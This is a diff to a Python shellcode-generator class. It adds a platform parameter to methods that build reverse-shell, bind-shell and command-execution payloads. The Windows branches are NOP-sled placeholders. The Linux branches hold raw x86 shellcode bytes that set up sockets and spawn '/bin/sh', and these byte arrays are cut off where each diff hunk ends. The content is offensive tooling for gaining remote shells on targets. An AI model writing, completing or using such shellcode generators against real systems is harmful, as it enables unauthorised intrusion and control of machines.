@@ -21,11 +21,13 @@ class ShellcodeGenerator:
             ]
         )
 
-    def generate_reverse_shell(self, host, port):
+    def generate_reverse_shell(self, host, port, platform='windows'):
         try:
             port = int(port)
-            if self.os_type == 'Windows':
-                shellcode = b"\x90" * 100
+            host = host.strip()
+
+            if platform == 'windows':
+                shellcode = b"\x90" * 100  # Placeholder for actual Windows shellcode
             else:
                 shellcode = (
                     b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
@@ -39,11 +41,12 @@ class ShellcodeGenerator:
             logging.error(f"Error generating reverse shell: {str(e)}")
             return None
 
-    def generate_bind_shell(self, port):
+    def generate_bind_shell(self, port, platform='windows'):
         try:
             port = int(port)
-            if self.os_type == 'Windows':
-                shellcode = b"\x90" * 100
+
+            if platform == 'windows':
+                shellcode = b"\x90" * 100  # Placeholder for actual Windows bind shell
             else:
                 shellcode = (
                     b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
@@ -57,10 +60,10 @@ class ShellcodeGenerator:
             logging.error(f"Error generating bind shell: {str(e)}")
             return None
 
-    def generate_exec(self, command):
+    def generate_exec(self, command, platform='windows'):
         try:
-            if self.os_type == 'Windows':
-                shellcode = b"\x90" * 100
+            if platform == 'windows':
+                shellcode = b"\x90" * 100  # Placeholder for actual Windows exec
             else:
                 shellcode = (
                     b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
